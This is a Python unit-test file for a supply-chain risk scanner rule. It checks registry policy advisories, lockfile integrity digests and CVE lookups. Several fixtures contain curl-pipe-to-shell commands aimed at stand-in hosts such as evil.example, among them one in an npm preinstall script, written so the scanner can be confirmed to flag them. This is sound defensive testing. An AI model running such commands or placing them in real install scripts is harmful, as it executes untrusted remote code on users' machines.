"""SR-008: Supply chain risk rule unit tests."""

import json
import base64
import hashlib
from datetime import date
from pathlib import Path

import jsonschema
import pytest

from scanners.risk_scanner.rules import installation_security, supply_chain
from scanners.risk_scanner.dependency_parsers.models import (
    DependencySourceObservation,
    DependencySourceUsage,
)
from scanners.risk_scanner.registry_policy import (
    RegistryClassification,
    RegistryEntry,
    RegistryPolicy,
)
from tests.scanner_mock import MockScanner


@pytest.fixture(autouse=True)
def _no_osv_network(monkeypatch):
    """SR-008 must never hit the real OSV.dev API in tests."""
    monkeypatch.setattr(supply_chain, "_query_osv", lambda *args, **kwargs: [])


class TestSR008SupplyChain:

    @staticmethod
    def _package_lock(host: str, count: int) -> str:
        packages = {
            f"node_modules/dependency-{index}": {
                "version": "1.0.0",
                "resolved": (
                    f"https://{host}/dependency-{index}/-/"
                    f"dependency-{index}-1.0.0.tgz"
                ),
                "integrity": f"sha512-{index}",
            }
            for index in range(count)
        }
        return json.dumps({"lockfileVersion": 3, "packages": packages})

    def test_curl_pipe_shell_in_code_file(self):
        """curl | sh in code file → critical finding (may co-trigger HTTP patterns)."""
        s = MockScanner(files={
            "setup.sh": "curl http://evil.example/x | sh\n",
        })
        supply_chain.run(s)
        assert len(s.findings) >= 1
        assert any(f["severity"] == "critical" for f in s.findings)
        f = s.findings[0]
        assert f["rule_id"] == "SR-008"
        assert f["category"] == "supply_chain"

    def test_whitelisted_download_is_not_trusted_when_piped_to_shell(self):
        """A trusted host does not make download-and-execute safe."""
        s = MockScanner(files={
            "install.py": 'import os\nos.system("curl https://github.com/foo/bar | sh")\n',
        })
        supply_chain.run(s)
        assert any(f["severity"] == "critical" for f in s.findings)
        assert s.findings[0]["disposition"] == "confirmed_vulnerability"

    def test_whitelisted_url_with_trailing_punctuation_is_skipped(self):
        """句尾逗号/句号不应破坏白名单 hostname 解析。"""
        s = MockScanner(files={"client.py": 'url = "https://api.openai.com/v1/models",\n'})
        supply_chain.run(s)
        assert s.findings == []

    def test_url_pattern_ignored_in_markdown(self):
        """URL-based patterns only run on code files, not .md links."""
        s = MockScanner(files={
            "README.md": "Install with: curl http://evil.example/x | sh\n",
        })
        supply_chain.run(s)
        assert s.findings == []

    def test_global_npm_install(self):
        """npm install -g in code file → high finding."""
        s = MockScanner(files={"setup.sh": "npm install -g eslint\n"})
        supply_chain.run(s)
        assert len(s.findings) == 1
        assert s.findings[0]["severity"] == "high"

    def test_npm_range_is_reconciled_with_package_lock(self):
        """A manifest range is reproducible when the lockfile pins it."""
        s = MockScanner(files={})
        s._file_contents = {
            "package.json": '{"dependencies":{"demo-lib":"^1.2.3"}}',
            "package-lock.json": '{"packages":{"":{"lockfileVersion":3},"node_modules/demo-lib":{"version":"1.2.7"}}}',
        }

        supply_chain.run(s)

        assert not any("版本未锁定" in finding["title"] for finding in s.findings)

    def test_unknown_registry_flood_is_one_policy_advisory(self):
        s = MockScanner(files={})
        s._file_contents = {
            "package-lock.json": self._package_lock(
                "registry.npmmirror.com", 275
            )
        }

        supply_chain.run(s)

        assert not any("非官方依赖源" in finding["title"] for finding in s.findings)
        advisories = [
            item for item in s.review_advisories
            if item["code"] == "dependency_registry_policy"
        ]
        assert len(advisories) == 1
        assert advisories[0]["level"] == "high"
        assert advisories[0]["category"] == "registry_policy"
        assert advisories[0]["deduction"] == 0
        assert advisories[0]["affects_grade"] is False
        assert advisories[0]["requires_manual_review"] is True
        assert "275 条" in advisories[0]["description"]
        assert "来源本身未经批准 275 条" in advisories[0]["description"]
        assert (
            "TAH_APPROVED_PRIVATE_REGISTRIES_JSON"
            in advisories[0]["description"]
        )
        assert "registry.npmmirror.com (275)" in advisories[0]["evidence"]
        details = advisories[0]["registry_policy"]
        assert details["occurrence_count"] == 275
        assert len(details["occurrences"]) == 100
        assert details["truncated"] is True
        assert details["occurrences"][0]["source_ref"].startswith("#/packages/")
        assert details["occurrences"][0]["integrity"] == "sha512-0"

    def test_registry_policy_group_and_total_evidence_budgets(self):
        packages = {
            f"node_modules/dependency-{host}-{index}": {
                "version": "1.0.0",
                "resolved": f"https://mirror-{host}.example/dependency-{index}.tgz",
            }
            for host in range(30)
            for index in range(30)
        }
        s = MockScanner(files={})
        s._file_contents = {"package-lock.json": json.dumps({
            "lockfileVersion": 3, "packages": packages,
        })}

        supply_chain.run(s)

        groups = [advisory for advisory in s.review_advisories
                  if advisory["code"] == "dependency_registry_policy"]
        overflow = [advisory for advisory in s.review_advisories
                    if advisory["code"] == "dependency_registry_policy_overflow"]
        assert len(groups) == 25
        assert len(overflow) == 1
        assert sum(len(group["registry_policy"]["occurrences"]) for group in groups) == 500
        assert all(group["registry_policy"]["truncated"] for group in groups)
        assert sum(group["registry_policy"]["occurrence_count"] for group in groups) == 750
        assert "150 条记录" in overflow[0]["description"]
        assert overflow[0]["level"] == "high"

    def test_registry_policy_samples_are_stable_across_lockfile_order(self):
        entries = [
            (f"node_modules/demo-{index}", {
                "version": "1.0.0",
                "resolved": f"https://registry.npmmirror.com/demo-{index}.tgz",
            })
            for index in range(5)
        ]

        def evidence(ordered_entries):
            s = MockScanner(files={})
            s._file_contents = {"package-lock.json": json.dumps({
                "lockfileVersion": 3, "packages": dict(ordered_entries),
            })}
            supply_chain.run(s)
            return s.review_advisories[0]["registry_policy"]["occurrences"]

        assert evidence(entries) == evidence(list(reversed(entries)))

    def test_registry_policy_sample_fields_have_size_limits(self):
        s = MockScanner(files={})
        s._file_contents = {"package-lock.json": json.dumps({
            "lockfileVersion": 3,
            "packages": {"node_modules/demo": {
                "version": "1.0.0",
                "resolved": "https://registry.npmmirror.com/" + "x" * 4000,
                "integrity": "sha512-" + "a" * 4000,
            }},
        })}

        supply_chain.run(s)

        sample = s.review_advisories[0]["registry_policy"]["occurrences"][0]
        assert len(sample["resolved_url"]) == 512
        assert len(sample["integrity"]) == 160
        assert sample["resolved_url"].endswith("…")

    def test_registry_policy_source_file_has_consistent_size_limit(self):
        from src.models.packages import RegistryPolicyEvidence

        long_path = "nested/" + "a" * 540 + "/package-lock.json"
        observation = DependencySourceObservation(
            ecosystem="npm",
            url="https://unapproved.example/demo.tgz",
            usage=DependencySourceUsage.RESOLVED_DOWNLOAD,
            source_file=long_path,
        )
        s = MockScanner(files={})

        supply_chain._check_dependency_sources(s, [observation])

        advisory = s.review_advisories[0]
        details = advisory["registry_policy"]
        assert len(details["source_file"]) == 512
        assert details["source_file"] == advisory["location"]["file"]
        assert details["source_file"] == details["occurrences"][0]["file"]
        assert details["source_file"].endswith("…")
        assert long_path not in advisory["evidence"]
        RegistryPolicyEvidence.model_validate(details)

    def test_manifest_source_ref_uses_original_json_pointer_key(self):
        records = supply_chain._manifest_records({"dependencies": {
            "python": [{"name": "requests"}],
            "vendor/tools": [{"name": "helper"}],
        }})

        assert (records[0].ecosystem, records[0].source_ref) == (
            "PyPI", "#/dependencies/python/0",
        )
        assert records[1].source_ref == "#/dependencies/vendor~1tools/0"

    def test_shared_url_retains_each_integrity_and_scope(self):
        resolved = "https://registry.npmmirror.com/shared.tgz"
        packages = {
            "node_modules/runtime-a": {
                "version": "1.0.0", "resolved": resolved, "integrity": "sha512-a",
            },
            "node_modules/runtime-b": {
                "version": "2.0.0", "resolved": resolved, "integrity": "sha512-b",
            },
            "node_modules/dev-c": {
                "version": "3.0.0", "resolved": resolved,
                "integrity": "sha512-c", "dev": True,
            },
        }
        s = MockScanner(files={})
        s._file_contents = {"package-lock.json": json.dumps({
            "lockfileVersion": 3, "packages": packages,
        })}

        supply_chain.run(s)

        assert s.dependency_scan["dependencies_found"] == 3
        assert len(s.review_advisories) == 1
        advisory = s.review_advisories[0]
        assert advisory["registry_policy"]["scope"] == "mixed"
        assert advisory["registry_policy"]["occurrence_count"] == 3
        assert advisory["level"] == "high"
        assert {item["scope"] for item in advisory["registry_policy"]["occurrences"]} == {"runtime", "dev"}
        assert {
            item["integrity"]
            for item in advisory["registry_policy"]["occurrences"]
        } == {"sha512-a", "sha512-b", "sha512-c"}
        assert {
            item["dependency_name"]
            for item in advisory["registry_policy"]["occurrences"]
        } == {"runtime-a", "runtime-b", "dev-c"}

    def test_mixed_dev_and_test_group_remains_warning_only(self):
        s = MockScanner(files={}, _package_metadata={
            "dependencies": {"npm": [
                {"name": "dev-helper", "version": "1.0.0", "scope": "dev",
                 "registry": "https://registry.npmmirror.com/"},
                {"name": "test-helper", "version": "1.0.0", "scope": "test",
                 "registry": "https://registry.npmmirror.com/"},
            ]},
        })

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        assert s.review_advisories[0]["level"] == "warning"
        assert s.review_advisories[0]["registry_policy"]["scope"] == "mixed"
        assert s.review_advisories[0]["registry_policy"]["occurrence_count"] == 2

    def test_requirements_latest_source_is_runtime_severity(self):
        s = MockScanner(files={})
        s._file_contents = {
            "requirements-latest.txt": (
                "--index-url https://registry.example/simple/\n"
                "demo==1.0.0\n"
            ),
        }

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        assert s.review_advisories[0]["level"] == "high"
        assert s.review_advisories[0]["registry_policy"]["scope"] == "runtime"

    def test_poetry_2_dev_only_source_stays_warning(self):
        s = MockScanner(files={})
        s._file_contents = {
            "poetry.lock": (
                '[[package]]\nname = "demo"\nversion = "1.0.0"\n'
                'groups = ["dev"]\n'
                '[package.source]\ntype = "legacy"\n'
                'url = "https://unapproved.example/simple"\n'
            ),
        }

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        advisory = s.review_advisories[0]
        assert advisory["level"] == "warning"
        assert advisory["registry_policy"]["scope"] == "dev"
        assert advisory["registry_policy"]["occurrences"][0]["scope"] == "dev"

    def test_integrity_uses_acquired_bytes_and_remains_independent_of_source_policy(self):
        good_bytes = b"verified dependency archive"
        other_bytes = b"different dependency archive"
        good_digest = base64.b64encode(hashlib.sha512(good_bytes).digest()).decode()
        other_digest = base64.b64encode(hashlib.sha512(other_bytes).digest()).decode()
        approved_url = "https://registry.npmjs.org/good/-/good-1.0.0.tgz"
        unapproved_url = "https://registry.npmmirror.com/bad/-/bad-1.0.0.tgz"
        s = MockScanner(files={})
        s._file_contents = {"package-lock.json": json.dumps({
            "lockfileVersion": 3,
            "packages": {
                "node_modules/good": {
                    "version": "1.0.0", "resolved": approved_url,
                    "integrity": f"sha512-{good_digest}",
                },
                "node_modules/bad": {
                    "version": "1.0.0", "resolved": unapproved_url,
                    "integrity": f"sha512-{other_digest}",
                },
            },
        })}
        s.dependency_artifacts = {
            approved_url: good_bytes,
            unapproved_url: good_bytes,
        }

        supply_chain.run(s)

        assert s.dependency_scan["integrity"] == {
            "status": "mismatch", "claimed_count": 2, "verified_count": 2,
            "mismatch_count": 1, "unavailable_count": 0, "unsupported_count": 0,
        }
        assert len(s.review_advisories) == 1
        assert s.review_advisories[0]["registry_policy"]["registry_host"] == "registry.npmmirror.com"
        mismatches = [finding for finding in s.findings if "完整性摘要不一致" in finding["title"]]
        assert len(mismatches) == 1
        assert mismatches[0]["llm_review_exempt"] is True

    def test_integrity_without_artifact_bytes_is_explicitly_not_checked(self):
        s = MockScanner(files={})
        s._file_contents = {"package-lock.json": self._package_lock("registry.npmjs.org", 2)}

        supply_chain.run(s)

        assert s.dependency_scan["integrity"]["status"] == "not_checked"
        assert s.dependency_scan["integrity"]["claimed_count"] == 2
        assert s.dependency_scan["integrity"]["verified_count"] == 0
        assert not any("完整性摘要不一致" in finding["title"] for finding in s.findings)

    def test_integrity_with_unsupported_digest_is_distinct_from_missing_bytes(self):
        unsupported_url = "https://registry.npmjs.org/unsupported.tgz"
        verified_url = "https://registry.npmjs.org/verified.tgz"
        content = b"dependency archive"
        verified_digest = base64.b64encode(hashlib.sha512(content).digest()).decode()
        s = MockScanner(files={})
        s._file_contents = {"package-lock.json": json.dumps({
            "lockfileVersion": 3,
            "packages": {"node_modules/unsupported": {
                "version": "1.0.0", "resolved": unsupported_url,
                "integrity": "md5-deadbeef",
            }},
        })}
        s.dependency_artifacts = {unsupported_url: content}

        supply_chain.run(s)

        assert s.dependency_scan["integrity"] == {
            "status": "unsupported", "claimed_count": 1, "verified_count": 0,
            "mismatch_count": 0, "unavailable_count": 0, "unsupported_count": 1,
        }
        schema_path = Path(__file__).resolve().parents[3] / "packages/schema/scan-report.schema.json"
        schema = json.loads(schema_path.read_text(encoding="utf-8"))
        status_schema = schema["properties"]["dependency_scan"]["properties"]["integrity"]["properties"]["status"]
        jsonschema.validate("unsupported", status_schema)

        s._file_contents = {"package-lock.json": json.dumps({
            "lockfileVersion": 3,
            "packages": {
                "node_modules/unsupported": {
                    "version": "1.0.0", "resolved": unsupported_url,
                    "integrity": "md5-deadbeef",
                },
                "node_modules/verified": {
                    "version": "1.0.0", "resolved": verified_url,
                    "integrity": f"sha512-{verified_digest}",
                },
            },
        })}
        s.dependency_artifacts[verified_url] = content
        supply_chain.run(s)
        assert s.dependency_scan["integrity"] == {
            "status": "partial", "claimed_count": 2, "verified_count": 1,
            "mismatch_count": 0, "unavailable_count": 0, "unsupported_count": 1,
        }

        del s.dependency_artifacts[verified_url]
        supply_chain.run(s)
        assert s.dependency_scan["integrity"] == {
            "status": "partial", "claimed_count": 2, "verified_count": 0,
            "mismatch_count": 0, "unavailable_count": 1, "unsupported_count": 1,
        }

    def test_source_evidence_redacts_url_credentials_and_query(self):
        s = MockScanner(files={})
        s._file_contents = {"package-lock.json": json.dumps({
            "lockfileVersion": 3,
            "packages": {"node_modules/demo": {
                "version": "1.0.0",
                "resolved": "https://user:password@registry.example/demo.tgz?token=secret#fragment",
            }},
        })}

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        url = s.review_advisories[0]["registry_policy"]["occurrences"][0]["resolved_url"]
        assert url == "https://registry.example/demo.tgz"
        assert "password" not in json.dumps(s.review_advisories)

    def test_invalid_url_evidence_identifies_each_rejected_url(self):
        urls = [
            "https://registry.example:invalid/first?token=secret",
            "https://registry.example:invalid/second?token=secret",
        ]
        s = MockScanner(files={}, _package_metadata={
            "dependencies": {"npm": [
                {"name": f"demo-{index}", "registry": url}
                for index, url in enumerate(urls)
            ]},
        })

        supply_chain.run(s)

        advisories = [item for item in s.review_advisories
                      if item["code"] == "dependency_registry_policy"]
        assert len(advisories) == 2
        assert all(item["registry_policy"]["policy_reason"] == "invalid_url"
                   for item in advisories)
        assert all(item["registry_policy"]["registry_host"] == "<invalid-or-non-registry-url>"
                   for item in advisories)
        assert {item["evidence"].split("url_samples=", 1)[1] for item in advisories} == {
            "https://registry.example:invalid/first",
            "https://registry.example:invalid/second",
        }
        assert "secret" not in json.dumps(advisories)

    def test_manifest_lock_mismatch_is_reported_once_without_registry_policy(self):
        s = MockScanner(files={})
        s._file_contents = {
            "package.json": json.dumps({
                "dependencies": {"alpha": "1.0.0", "beta": "2.0.0"},
            }),
            "package-lock.json": json.dumps({
                "lockfileVersion": 3,
                "packages": {"": {"dependencies": {"alpha": "1.1.0"}}},
            }),
        }

        supply_chain.run(s)

        assert s.dependency_scan["manifest_lock"] == {
            "status": "mismatch", "checked_pairs": 1, "mismatch_count": 2,
            "unchecked_count": 0,
        }
        assert len([finding for finding in s.findings if "清单与锁文件" in finding["title"]]) == 1
        assert s.review_advisories == []

    def test_manifest_lock_match_is_recorded(self):
        declarations = {"dependencies": {"alpha": "^1.0.0"}, "devDependencies": {"test": "2.0.0"}}
        s = MockScanner(files={})
        s._file_contents = {
            "package.json": json.dumps(declarations),
            "package-lock.json": json.dumps({
                "lockfileVersion": 3, "packages": {"": declarations},
            }),
        }

        supply_chain.run(s)

        assert s.dependency_scan["manifest_lock"] == {
            "status": "matched", "checked_pairs": 1, "mismatch_count": 0,
            "unchecked_count": 0,
        }

    def test_manifest_lock_equivalent_exact_versions_and_unresolved_specs(self):
        s = MockScanner(files={})
        s._file_contents = {
            "package.json": json.dumps({"dependencies": {
                "exact": "1.0.0", "local": "file:../local",
            }}),
            "package-lock.json": json.dumps({
                "lockfileVersion": 3,
                "packages": {"": {"dependencies": {
                    "exact": "=1.0.0", "local": "workspace:*",
                }}},
            }),
        }

        supply_chain.run(s)

        assert s.dependency_scan["manifest_lock"] == {
            "status": "partial", "checked_pairs": 1, "mismatch_count": 0,
            "unchecked_count": 1,
        }
        assert not any("清单与锁文件" in finding["title"] for finding in s.findings)

    def test_registry_policy_does_not_suppress_install_script_review(self):
        manifest = json.dumps({
            "dependencies": {"demo": "1.0.0"},
            "scripts": {"preinstall": "curl https://example.test/install.sh | sh"},
        })
        s = MockScanner(files={"package.json": manifest})
        s._file_contents = {
            "package.json": manifest,
            "package-lock.json": json.dumps({
                "lockfileVersion": 3,
                "packages": {
                    "": {"dependencies": {"demo": "1.0.0"}},
                    "node_modules/demo": {
                        "version": "1.0.0",
                        "resolved": "https://registry.npmjs.org/demo/-/demo-1.0.0.tgz",
                    },
                },
            }),
        }

        supply_chain.run(s)
        installation_security.run(s)

        assert s.review_advisories == []
        assert s.dependency_scan["manifest_lock"]["status"] == "matched"
        assert any(finding["rule_id"] == "SR-020" for finding in s.findings)

    def test_official_registry_produces_no_source_advisory(self):
        s = MockScanner(files={})
        s._file_contents = {
            "package-lock.json": self._package_lock(
                "registry.npmjs.org", 20
            )
        }

        supply_chain.run(s)

        assert s.review_advisories == []
        assert not any("依赖来源" in finding["title"] for finding in s.findings)

    def test_yarn_classic_default_lockfile_produces_no_source_advisory(self):
        s = MockScanner(files={})
        s._file_contents = {
            "yarn.lock": (
                "# yarn lockfile v1\n\n"
                "lodash@^4.17.0:\n"
                '  version "4.17.21"\n'
                '  resolved "https://registry.yarnpkg.com/lodash/-/'
                'lodash-4.17.21.tgz#deadbeefdeadbeefdeadbeefdeadbeefdeadbeef"\n'
                "  integrity sha512-demo\n"
            )
        }

        supply_chain.run(s)

        assert not any(
            advisory["code"] == "dependency_registry_policy"
            for advisory in s.review_advisories
        )

    def test_manifest_registry_is_checked_alongside_lockfile_sources(self):
        s = MockScanner(
            files={},
            _package_metadata={
                "dependencies": {
                    "npm": [{
                        "name": "demo",
                        "version": "1.0.0",
                        "registry": "https://npm.corp.example/",
                    }]
                }
            },
        )
        s._file_contents = {
            "package-lock.json": self._package_lock("registry.npmjs.org", 1)
        }

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        assert "npm.corp.example" in s.review_advisories[0]["evidence"]

    def test_python_and_npm_git_sources_keep_distinct_policy_reasons(self):
        s = MockScanner(files={})
        s._file_contents = {
            "package.json": json.dumps({
                "dependencies": {
                    "npm-git-demo": "git+ssh://git@github.com/example/npm-demo.git",
                    "npm-shortcut-demo": "github:example/short-demo",
                }
            }),
            "requirements.txt": (
                "python-git-demo[security] @ "
                "git+ssh://git@gitlab.com/example/python-demo.git\n"
            ),
        }

        supply_chain.run(s)

        assert len(s.review_advisories) == 3
        groups = {
            (item["registry_policy"]["registry_host"], item["registry_policy"]["policy_reason"])
            for item in s.review_advisories
        }
        assert groups == {
            ("github.com", "non_registry_source"),
            ("github.com", "unknown_host"),
            ("gitlab.com", "non_registry_source"),
        }
        assert not any(
            "非官方依赖源" in finding["title"] for finding in s.findings
        )

    def test_short_find_links_and_bare_url_are_one_policy_advisory(self):
        s = MockScanner(files={})
        s._file_contents = {
            "requirements.txt": (
                "-f https://evil.example/wheels\n"
                "https://evil.example/demo-1.0-py3-none-any.whl\n"
            )
        }

        supply_chain.run(s)

        advisories = [
            item for item in s.review_advisories
            if item["code"] == "dependency_registry_policy"
        ]
        assert len(advisories) == 1
        assert "2 条" in advisories[0]["description"]
        assert "evil.example (2)" in advisories[0]["evidence"]
        assert "unknown_host (2)" in advisories[0]["evidence"]
        assert s.findings == []

    @pytest.mark.parametrize(
        "command",
        [
            "npm install -f --registry https://mirror.internal/ demo\n",
            "npm install -f \\\n  --registry https://mirror.internal/ demo\n",
        ],
    )
    def test_npm_force_keeps_registry_api_approval(self, command):
        s = MockScanner(files={"setup.sh": command})
        s.registry_policy = RegistryPolicy([
            RegistryEntry(
                ecosystem="npm",
                exact_host="mirror.internal",
                classification=RegistryClassification.APPROVED_PRIVATE,
                evidence_url="https://security.internal/npm",
                allow_as_resolved_download=False,
                note="Approved for npm registry API use only.",
                reviewed_at=date(2026, 9, 23),
            )
        ])

        supply_chain.run(s)

        assert s.review_advisories == []

    @pytest.mark.parametrize("option", ["-f", "--find-links"])
    def test_pip_find_links_continuation_requires_download_approval(
        self, option
    ):
        s = MockScanner(files={
            "setup.sh": (
                f"pip install {option} \\\n"
                "  https://registry.example/wheels demo\n"
            )
        })
        s.registry_policy = RegistryPolicy([
            RegistryEntry(
                ecosystem="pypi",
                exact_host="registry.example",
                classification=RegistryClassification.APPROVED_PRIVATE,
                evidence_url="https://security.example/pypi",
                allow_as_resolved_download=False,
                note="Approved for registry API use only.",
                reviewed_at=date(2026, 9, 23),
            )
        ])

        supply_chain.run(s)

        advisories = [
            item for item in s.review_advisories
            if item["code"] == "dependency_registry_policy"
        ]
        assert len(advisories) == 1
        assert "usage_not_allowed (1)" in advisories[0]["evidence"]

    def test_registry_advisory_separates_all_exact_hosts(self):
        packages = {
            f"node_modules/dependency-{index}": {
                "version": "1.0.0",
                "resolved": f"https://registry-{index}.example/pkg.tgz",
            }
            for index in range(7)
        }
        s = MockScanner(files={})
        s._file_contents = {
            "package-lock.json": json.dumps({
                "lockfileVersion": 3,
                "packages": packages,
            })
        }

        supply_chain.run(s)

        assert len(s.review_advisories) == 7
        assert {
            item["registry_policy"]["registry_host"]
            for item in s.review_advisories
        } == {f"registry-{index}.example" for index in range(7)}
        assert all(item["registry_policy"]["occurrence_count"] == 1 for item in s.review_advisories)

    def test_registry_advisory_separates_source_files(self):
        s = MockScanner(files={})
        s._file_contents = {
            ".npmrc": "registry=https://registry.corp.example/\n",
            "package-lock.json": self._package_lock(
                "registry.corp.example", 2
            ),
        }

        supply_chain.run(s)

        assert len(s.review_advisories) == 2
        counts = {
            item["registry_policy"]["source_file"]: item["registry_policy"]["occurrence_count"]
            for item in s.review_advisories
        }
        assert counts == {".npmrc": 1, "package-lock.json": 2}

    def test_dependency_urls_in_code_keep_distinct_hosts(self):
        s = MockScanner(files={
            "setup.sh": (
                "npm config set registry https://registry-one.example/\n"
                "npm config set registry https://registry-two.example/\n"
            )
        })

        supply_chain.run(s)

        assert len(s.review_advisories) == 2
        assert {item["registry_policy"]["registry_host"] for item in s.review_advisories} == {
            "registry-one.example", "registry-two.example"
        }
        assert not any(
            "非官方包源" in finding["title"] for finding in s.findings
        )

    def test_duplicate_inline_dependency_urls_keep_both_locations(self):
        source = "https://registry.corp.example/"
        s = MockScanner(files={
            "setup.sh": (
                f"npm config set registry {source}\n"
                f"npm config set registry {source}\n"
            )
        })

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        advisory = s.review_advisories[0]
        assert "检测到 2 条" in advisory["description"]
        assert "registry.corp.example (2)" in advisory["evidence"]
        assert {item["line"] for item in advisory["registry_policy"]["occurrences"]} == {1, 2}

    def test_official_dependency_url_in_code_is_clean(self):
        s = MockScanner(files={
            "setup.sh": (
                "npm config set registry https://registry.npmjs.org/\n"
            )
        })

        supply_chain.run(s)

        assert s.review_advisories == []
        assert s.findings == []

    def test_bare_official_npm_download_url_in_code_is_clean(self):
        s = MockScanner(files={
            "install.py": (
                'DOWNLOAD_URL = "https://registry.npmjs.org/'
                'lodash/-/lodash-4.17.21.tgz"\n'
            )
        }, _package_metadata={"name": "demo", "version": "1.0.0"})

        supply_chain.run(s)

        assert not any(
            advisory["code"] == "dependency_registry_policy"
            for advisory in s.review_advisories
        )

    def test_real_scanner_bare_official_npm_url_is_clean(self, tmp_path):
        from scanners.risk_scanner.scanner import RiskScanner

        (tmp_path / "manifest.json").write_text(
            json.dumps({
                "name": "registry-regression",
                "version": "1.0.0",
                "type": "skill",
                "description": "Registry policy regression fixture.",
                "author": "TrustedAgentHub",
                "license": "Apache-2.0",
                "permissions": {},
            }),
            encoding="utf-8",
        )
        (tmp_path / "install.py").write_text(
            'DOWNLOAD_URL = "https://registry.npmjs.org/'
            'lodash/-/lodash-4.17.21.tgz"\n',
            encoding="utf-8",
        )

        report = RiskScanner(tmp_path).scan()

        assert not any(
            advisory["code"] == "dependency_registry_policy"
            for advisory in report["review_advisories"]
        )

    @pytest.mark.parametrize(
        "command",
        [
            "pip install -i https://pypi.org/simple flask\n",
            (
                "dotnet nuget add source "
                "https://api.nuget.org/v3/index.json\n"
            ),
        ],
    )
    def test_official_short_form_registry_commands_have_no_advisory(
        self, command
    ):
        assert supply_chain._dependency_usage_near_line(
            command.split("\n"), 1
        ) == "registry_api"
        s = MockScanner(files={"setup.sh": command})

        supply_chain.run(s)

        assert not any(
            advisory["code"] == "dependency_registry_policy"
            for advisory in s.review_advisories
        )

    def test_http_dependency_sources_are_aggregated_separately(self):
        s = MockScanner(files={})
        lock = json.loads(self._package_lock("registry.npmjs.org", 3))
        for package in lock["packages"].values():
            package["resolved"] = package["resolved"].replace(
                "https://", "http://"
            )
        s._file_contents = {"package-lock.json": json.dumps(lock)}

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        transport_findings = [
            finding for finding in s.findings
            if finding["title"] == "依赖来源使用 HTTP 明文传输"
        ]
        assert len(transport_findings) == 1
        assert transport_findings[0]["severity"] == "medium"
        assert "3 条" in transport_findings[0]["description"]

    def test_unknown_http_registry_still_reports_transport_risk(self):
        s = MockScanner(files={})
        lock = json.loads(self._package_lock("registry.unknown.example", 2))
        for package in lock["packages"].values():
            package["resolved"] = package["resolved"].replace(
                "https://", "http://"
            )
        s._file_contents = {"package-lock.json": json.dumps(lock)}

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        advisory = s.review_advisories[0]
        assert "传输或凭据不安全 2 条" in advisory["description"]
        assert "改用 HTTPS" in advisory["description"]
        assert "insecure_scheme (2)" in advisory["evidence"]
        assert sum(
            finding["title"] == "依赖来源使用 HTTP 明文传输"
            for finding in s.findings
        ) == 1

    def test_registry_advisory_distinguishes_endpoint_usage_mismatch(self):
        s = MockScanner(files={
            "setup.sh": "pip install https://pypi.org/simple/demo/\n"
        })

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        advisory = s.review_advisories[0]
        assert (
            "已批准端点的使用方式不匹配 1 条"
            in advisory["description"]
        )
        assert "通常无需新增审批" in advisory["description"]
        assert "usage_not_allowed (1)" in advisory["evidence"]
        assert "来源本身未经批准" not in advisory["description"]

    def test_registry_approval_does_not_skip_cve_lookup(self, monkeypatch):
        monkeypatch.setattr(
            supply_chain,
            "_query_osv",
            lambda *args, **kwargs: ["CVE-2099-0001"],
        )
        s = MockScanner(files={})
        s._file_contents = {
            "package-lock.json": self._package_lock("registry.npmjs.org", 1)
        }

        supply_chain.run(s)

        assert s.review_advisories == []
        assert any(
            "CVE-2099-0001" in finding["title"] for finding in s.findings
        )

    def test_known_dependency_vulnerability_skips_llm_semantic_review(self, monkeypatch):
        from src.routers import trust
        from scanners.risk_scanner import llm_reviewer
        from scanners.risk_scanner.redaction import build_finding_context_bundle

        monkeypatch.setattr(supply_chain, "_query_osv", lambda *args, **kwargs: ["CVE-2099-0001"])
        s = MockScanner(files={})
        s._file_contents = {
            "package-lock.json": self._package_lock("registry.npmjs.org", 1)
        }
        supply_chain.run(s)
        cve = next(item for item in s.findings if "CVE-2099-0001" in item["title"])
        cve["id"] = "known-cve"

        assert cve["severity"] == "high"
        assert cve["llm_review_exempt"] is True
        assert trust._is_llm_reviewable_finding(cve) is False
        assert build_finding_context_bundle([cve], s._file_contents)[0] == {}
        result = llm_reviewer.run_llm_review([cve], {}, {})
        assert result["status"] == "not_required"
        assert result["findings_skipped"] == 1

    def test_requirement_version_fragment_is_not_sent_to_osv(self, monkeypatch):
        queries = []

        def capture_query(package_name, version, ecosystem):
            queries.append((package_name, version, ecosystem))
            return []

        monkeypatch.setattr(supply_chain, "_query_osv", capture_query)
        s = MockScanner(files={})
        s._file_contents = {
            "requirements.txt": "requests==2.31.0#sha256=deadbeef\n"
        }

        supply_chain.run(s)

        assert queries == [("requests", "2.31.0", "PyPI")]

    def test_risk_scanner_end_to_end_collapses_registry_flood(self, tmp_path):
        from scanners.risk_scanner.dependency_parsers.osv_client import (
            OSVQueryResult,
        )
        from scanners.risk_scanner.scanner import RiskScanner

        (tmp_path / "package-lock.json").write_text(
            self._package_lock("registry.npmmirror.com", 275),
            encoding="utf-8",
        )
        scanner = RiskScanner(tmp_path)

        class NoVulnerabilityClient:
            max_queries = 500
            queried = 0

            def query(self, dependency):
                self.queried += 1
                return OSVQueryResult([], None)

        scanner.osv_client = NoVulnerabilityClient()

        report = scanner.scan()

        policy_advisories = [
            item for item in report["review_advisories"]
            if item["code"] == "dependency_registry_policy"
        ]
        assert len(policy_advisories) == 1
        assert "275 条" in policy_advisories[0]["description"]
        assert not any(
            "非官方依赖源" in finding["title"]
            for finding in report["findings"]
        )
        assert report["dependency_scan"]["dependencies_queried"] == 275
        from src.models.packages import ScanReport

        schema_path = Path(__file__).resolve().parents[3] / "packages/schema/scan-report.schema.json"
        jsonschema.validate(report, json.loads(schema_path.read_text(encoding="utf-8")))
        ScanReport.model_validate(report)

    def test_risk_scanner_verifies_supplied_dependency_artifact(self, tmp_path):
        from scanners.risk_scanner.dependency_parsers.osv_client import OSVQueryResult
        from scanners.risk_scanner.scanner import RiskScanner

        artifact = b"npm tarball bytes supplied by acquisition"
        digest = base64.b64encode(hashlib.sha512(artifact).digest()).decode()
        resolved = "https://registry.npmjs.org/demo/-/demo-1.0.0.tgz"
        (tmp_path / "package-lock.json").write_text(json.dumps({
            "lockfileVersion": 3,
            "packages": {"node_modules/demo": {
                "version": "1.0.0", "resolved": resolved,
                "integrity": f"sha512-{digest}",
            }},
        }), encoding="utf-8")
